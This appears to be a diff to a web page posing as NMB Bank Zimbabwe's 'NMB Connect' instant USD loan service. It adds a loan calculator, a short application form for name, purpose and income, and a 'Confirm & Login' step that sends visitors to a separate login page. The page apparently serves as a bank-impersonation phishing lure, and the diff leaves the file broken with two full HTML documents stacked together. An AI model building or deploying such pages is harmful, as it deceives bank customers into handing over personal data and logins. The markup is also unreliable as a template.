@@ -2,6 +2,339 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#003366">
+    <title>NMB Connect | Instant Loans</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --nmb-blue: #003366;
+            --nmb-gold: #E4C16A;
+            --nmb-light-blue: #4a90e2;
+            --white: #ffffff;
+            --bg-overlay: rgba(0, 0, 0, 0.65);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            min-height: 100vh;
+            color: white;
+            line-height: 1.6;
+        }
+
+        header {
+            padding: 20px 5%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo { font-size: 26px; font-weight: 800; text-decoration: none; display: flex; align-items: center; }
+        .logo .nmb { color: var(--nmb-light-blue); }
+        .logo .connect { color: var(--nmb-gold); margin-left: 2px; }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .hero-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .hero-section h1 { font-size: 28px; font-weight: 700; margin-bottom: 10px; }
+        .hero-section h1 span { color: var(--nmb-gold); }
+        .hero-section p { font-size: 14px; opacity: 0.9; }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 28px;
+            padding: 30px 25px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-align: center;
+            color: var(--nmb-gold);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .input-group { margin-bottom: 25px; }
+        .input-label { display: flex; justify-content: space-between; font-weight: 600; font-size: 13px; margin-bottom: 12px; }
+        .input-label span:last-child { color: var(--nmb-gold); font-size: 16px; font-weight: 700; }
+
+        input[type="range"] {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            outline: none;
+            -webkit-appearance: none;
+        }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            background: var(--nmb-gold);
+            border: 3px solid var(--nmb-blue);
+            border-radius: 50%;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(0,0,0,0.3);
+        }
+
+        .calc-summary {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 18px;
+            border: 1px solid rgba(228, 193, 106, 0.2);
+            margin-bottom: 25px;
+        }
+        .summary-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 10px; }
+        .summary-row.total { border-top: 1px dashed rgba(255, 255, 255, 0.2); margin-top: 12px; padding-top: 12px; font-weight: 800; font-size: 18px; color: var(--white); }
+        .summary-row.total span:last-child { color: var(--nmb-gold); }
+
+        .btn-apply {
+            width: 100%;
+            background: var(--white);
+            color: var(--nmb-blue);
+            border: none;
+            padding: 18px;
+            border-radius: 16px;
+            font-weight: 800;
+            font-size: 15px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.2s;
+            letter-spacing: 1px;
+        }
+        .btn-apply:active { transform: scale(0.98); }
+
+        /* Modal Styles */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 30, 60, 0.95);
+            display: none;
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .mini-page {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            width: 100%;
+            max-width: 400px;
+            border-radius: 28px;
+            padding: 35px 25px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .step { display: none; }
+        .step.active { display: block; }
+
+        .form-group { margin-bottom: 20px; text-align: left; }
+        .form-group label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 8px; color: var(--nmb-gold); text-transform: uppercase; }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 1.5px solid rgba(255, 255, 255, 0.25);
+            border-radius: 14px;
+            color: white;
+            font-family: inherit;
+            outline: none;
+            font-size: 15px;
+        }
+        .form-group input:focus { border-color: var(--nmb-gold); }
+        .form-group select option { background: var(--nmb-blue); color: white; }
+
+        .btn-next {
+            width: 100%;
+            background: var(--white);
+            color: var(--nmb-blue);
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+
+        .cancel-link { text-align: center; margin-top: 15px; }
+        .cancel-link a { font-size: 12px; color: rgba(255, 255, 255, 0.6); text-decoration: none; }
+
+        footer { padding: 30px; text-align: center; font-size: 11px; opacity: 0.6; }
+
+        @media (max-width: 480px) {
+            .hero-section h1 { font-size: 24px; }
+            .card { padding: 25px 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <a class="logo" href="#">
+            <span class="nmb">NMB</span><span class="connect">Connect</span>
+        </a>
+    </header>
+
+    <div class="container">
+        <div class="hero-section">
+            <h1>Instant <span>USD Loans</span></h1>
+            <p>Secure digital lending for NMB Connect users.</p>
+        </div>
+
+        <div class="card">
+            <div class="card-title">Loan Calculator</div>
+            
+            <div class="input-group">
+                <div class="input-label">
+                    <span>Desired Amount</span>
+                    <span id="amtText">$1,000 USD</span>
+                </div>
+                <input type="range" id="amtRange" min="500" max="5000" step="100" value="1000" oninput="update()">
+            </div>
+
+            <div class="input-group">
+                <div class="input-label">
+                    <span>Repayment Period</span>
+                    <span id="perText">12 Months</span>
+                </div>
+                <input type="range" id="perRange" min="3" max="24" step="1" value="12" oninput="update()">
+            </div>
+
+            <div class="calc-summary">
+                <div class="summary-row"><span>Monthly Installment</span><span id="monVal">$88.85</span></div>
+                <div class="summary-row"><span>Interest Rate</span><span>12% p.a</span></div>
+                <div class="summary-row total"><span>Total Repayment</span><span id="totVal">$1,066.19</span></div>
+            </div>
+
+            <button class="btn-apply" onclick="openApply()">Apply for this Loan</button>
+        </div>
+    </div>
+
+    <!-- Mini-Page Overlay -->
+    <div class="overlay" id="applyOverlay">
+        <div class="mini-page">
+            <!-- Step 1 -->
+            <div id="step1" class="step active">
+                <div class="card-title">Personal Details</div>
+                <div class="form-group">
+                    <label>First Name</label>
+                    <input type="text" id="fName" placeholder="Enter first name">
+                </div>
+                <div class="form-group">
+                    <label>Last Name</label>
+                    <input type="text" id="lName" placeholder="Enter last name">
+                </div>
+                <button class="btn-next" onclick="goStep(2)">Continue</button>
+                <div class="cancel-link"><a href="#" onclick="closeApply()">Cancel Application</a></div>
+            </div>
+
+            <!-- Step 2 -->
+            <div id="step2" class="step">
+                <div class="card-title">Employment & Purpose</div>
+                <div class="form-group">
+                    <label>Loan Purpose</label>
+                    <select id="purpose">
+                        <option>Education</option>
+                        <option>Business</option>
+                        <option>Medical</option>
+                        <option>Other</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Monthly Income (USD)</label>
+                    <input type="number" id="income" placeholder="e.g. 1000">
+                </div>
+                <button class="btn-next" onclick="goStep(3)">Review Details</button>
+                <div class="cancel-link"><a href="#" onclick="goStep(1)">Back to Previous</a></div>
+            </div>
+
+            <!-- Step 3 -->
+            <div id="step3" class="step">
+                <div class="card-title">Review Application</div>
+                <div class="calc-summary" style="margin-bottom: 20px;">
+                    <div class="summary-row"><span>Applicant</span><span id="sumName"></span></div>
+                    <div class="summary-row"><span>Loan Amount</span><span id="sumAmt"></span></div>
+                    <div class="summary-row"><span>Purpose</span><span id="sumPurp"></span></div>
+                </div>
+                <button class="btn-next" onclick="finish()">Confirm & Login</button>
+                <div class="cancel-link"><a href="#" onclick="goStep(2)">Back to Edit</a></div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 NMB Bank Limited. Zimbabwe.</p>
+    </footer>
+
+    <script>
+        // Calculator
+        function update() {
+            const a = parseInt(document.getElementById('amtRange').value);
+            const p = parseInt(document.getElementById('perRange').value);
+            const r = 0.12 / 12;
+
+            document.getElementById('amtText').textContent = `$${a.toLocaleString()} USD`;
+            document.getElementById('perText').textContent = `${p} Months`;
+
+            const m = (a * r * Math.pow(1 + r, p)) / (Math.pow(1 + r, p) - 1);
+            const t = m * p;
+
+            document.getElementById('monVal').textContent = `$${m.toFixed(2)}`;
+            document.getElementById('totVal').textContent = `$${t.toFixed(2)}`;
+        }
+
+        // Overlay Flow
+        function openApply() { document.getElementById('applyOverlay').style.display = 'flex'; }
+        function closeApply() { document.getElementById('applyOverlay').style.display = 'none'; }
+        
+        function goStep(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + n).classList.add('active');
+            if(n === 3) {
+                document.getElementById('sumName').textContent = document.getElementById('fName').value + ' ' + document.getElementById('lName').value;
+                document.getElementById('sumAmt').textContent = document.getElementById('amtText').textContent;
+                document.getElementById('sumPurp').textContent = document.getElementById('purpose').value;
+            }
+        }
+
+        function finish() { 
+            const a = document.getElementById('amtRange').value;
+            const p = document.getElementById('purpose').value;
+            window.location.href = `login.html?data=${encodeURIComponent(p)}&price=${a}`; 
+        }
+
+        update();
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="description" content="NMB Bank Zimbabwe - Fast USD Loans with Competitive Rates. Salary Loans, School Fees Loans, Business Loans. Quick Approval, Flexible Repayment.">
     <meta name="theme-color" content="#001f3f">
@@ -1294,5 +1627,18 @@
             }
         });
     </script>
+    <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6a5b4033940f101d5323aacd/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
 </body>
 </html>
